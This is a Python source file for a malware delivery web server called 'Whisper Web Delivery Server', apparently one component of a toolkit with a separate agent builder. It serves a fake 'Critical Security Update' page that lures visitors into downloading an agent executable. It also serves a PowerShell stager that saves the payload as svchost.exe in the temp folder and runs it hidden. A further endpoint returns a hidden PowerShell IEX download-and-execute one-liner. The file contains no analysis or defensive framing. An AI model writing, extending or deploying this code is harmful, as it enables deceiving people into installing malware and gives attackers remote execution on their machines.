import http.server
import socketserver
import os
import sys
import urllib.parse
import json
import base64
import threading
import webbrowser

PORT = 8080
HOST = "0.0.0.0"
AGENT_FILE = ""
STAGER_FILE = ""

PAGE_TEMPLATE = """<!DOCTYPE html>
<html>
<head><title>Update Required</title>
<style>
body {{ background: #1a1a2e; color: #e0e0e0; font-family: 'Segoe UI', Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
.card {{ background: #16213e; padding: 40px; border-radius: 12px; border-left: 4px solid #e94560; max-width: 500px; text-align: center; }}
h1 {{ color: #e94560; font-size: 24px; }}
p {{ color: #a0a0a0; line-height: 1.6; }}
.btn {{ display: inline-block; background: #e94560; color: #fff; padding: 12px 30px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 20px; }}
.btn:hover {{ background: #ff6b81; }}
.footer {{ margin-top: 30px; font-size: 12px; color: #555; }}
</style>
</head>
<body>
<div class="card">
<h1>Critical Security Update</h1>
<p>Your browser needs an important security update to continue securely.<br>Please download and run the update below.</p>
<a class="btn" href="/agent.exe" download>Download Update</a>
<p style="margin-top:20px;font-size:12px;color:#555;">{timestamp}</p>
<div class="footer">Secured by TLS 3.4.2</div>
</div>
</body>
</html>"""

STAGER_PS1 = """$url = "{server_url}/agent.exe"
$path = "$env:TEMP\\svchost.exe"
try {{
    (New-Object Net.WebClient).DownloadFile($url, $path)
    Start-Process -WindowStyle Hidden -FilePath $path
}} catch {{
    try {{
        $wc = New-Object System.Net.WebClient
        $data = $wc.DownloadData($url)
        [System.IO.File]::WriteAllBytes($path, $data)
        Start-Process -WindowStyle Hidden -FilePath $path
    }} catch {{}}
}}"""

class PayloadHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            import datetime
            page = PAGE_TEMPLATE.replace("{timestamp}", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            self.wfile.write(page.encode())
        elif path == "/agent.exe":
            if AGENT_FILE and os.path.exists(AGENT_FILE):
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", "attachment; filename=update.exe")
                self.send_header("Cache-Control", "no-cache")
                self.end_headers()
                with open(AGENT_FILE, "rb") as f:
                    while True:
                        chunk = f.read(65536)
                        if not chunk: break
                        self.wfile.write(chunk)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Agent not configured. Run builder.py first.")
        elif path == "/stager.ps1":
            server_ip = self.server.server_address[0]
            if server_ip == "0.0.0.0":
                import socket
                server_ip = socket.gethostbyname(socket.gethostname())
            port = self.server.server_address[1]
            stager = STAGER_PS1.replace("{server_url}", f"http://{server_ip}:{port}")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(stager.encode())
        elif path == "/command":
            powershell_cmd = f'powershell -NoP -NonI -W Hidden -C "IEX (New-Object Net.WebClient).DownloadString(''http://{self.server.server_address[0]}:{self.server.server_address[1]}/stager.ps1'')"'
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(powershell_cmd.encode())
        else:
            super().do_GET()

    def log_message(self, format, *args):
        sys.stderr.write(f"[WEB] {args[0]} {args[1]} {args[2]}\n")

class ThreadedServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    allow_reuse_address = True
    daemon_threads = True

def start_web_server(agent_path="", port=PORT):
    global AGENT_FILE, PORT
    AGENT_FILE = agent_path
    PORT = port
    server = ThreadedServer((HOST, port), PayloadHandler)
    print(f"[WEB] Server running at http://0.0.0.0:{port}")
    if AGENT_FILE:
        print(f"[WEB] Serving payload: {AGENT_FILE}")
    print(f"[WEB] Stager: http://0.0.0.0:{port}/stager.ps1")
    print(f"[WEB] Deployment command: http://0.0.0.0:{port}/command\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[WEB] Server stopped")
        server.shutdown()
    return server

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Whisper Web Delivery Server")
    parser.add_argument("--port", type=int, default=8080, help="Web server port")
    parser.add_argument("--agent", default="", help="Path to compiled agent EXE")
    parser.add_argument("--open", action="store_true", help="Open landing page in browser")
    args = parser.parse_args()

    if args.open:
        webbrowser.open(f"http://127.0.0.1:{args.port}")

    start_web_server(agent_path=args.agent, port=args.port)

if __name__ == "__main__":
    main()
